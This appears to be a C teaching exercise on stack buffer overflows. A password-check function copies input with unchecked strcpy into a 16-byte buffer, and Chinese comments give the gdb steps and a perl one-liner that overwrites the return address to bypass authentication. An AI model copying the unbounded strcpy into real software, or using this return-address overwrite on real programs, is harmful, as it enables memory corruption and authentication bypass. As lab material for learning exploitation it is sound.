#include <stdlib.h>
#include <stdio.h>
#include <string.h>

/**
 * 1 gcc -fno-stack-protector  -g -o auth2 auth_overflow2.c
 *  gcc堆栈保护会：1）flag的地址在pass_buff的低地址，使得pass_buff无法覆盖flag
 *               2）会提前保存函数的返回地址，一旦通过shellcode篡改，报__stack_chk_fail
 * 2 gdb auth2
 *   disass main 找到要跳转的地址0x080485c5
 *   break 39 (if(check(argv[1])){)
 *   break 25 (strcpy(pass_buff,pass);)
 *   run <any_params>
 *   获得进入check之前的堆栈布局： 
 *      x/20xw $esp -> address_of_esp
 *   continue
 *   获得进入check之后的堆栈布局：
 *      x/20xw $esp
 *      上一步拿到的address_of_esp，在新的布局就是pass的参数地址，然后是check函数的返回地址address_of_check_ret，然后就是旧的ebp(sfp:栈帧指针),然后就是局部变量的了
 *      看看局部变量pass_buff的地址和存函数返回地址的地址差多少，构造溢出参数
 * 3  ./auth2 $(perl -e  'print "\xc5\x85\x04\x08"x10')
 *   1)32位的系统地址一般没有\x0。64位有，bash传参的时候会warning，忽略\x0输入
 *   2)溢出参数这里输入了10次目标地址，增加命中率
 *   3)64位的话，地址都是8字节，这个需要考虑是否还适用
 */

int check(char* pass){
    int flag=0;
    char pass_buff[16];

    strcpy(pass_buff,pass);
    if(strcmp(pass_buff,"admin")==0){
        flag=1;
    }
    if(strcmp(pass_buff,"root")==0){
        flag=1;
    }
    return flag;
}

int main(int argc,char* argv[]){
    if(argc<2){
        printf("usage: %s <password>\n",argv[0]);
        exit(0);
    }
    if(check(argv[1])){
        printf("access granted!\n");
    }
    return 0;
}
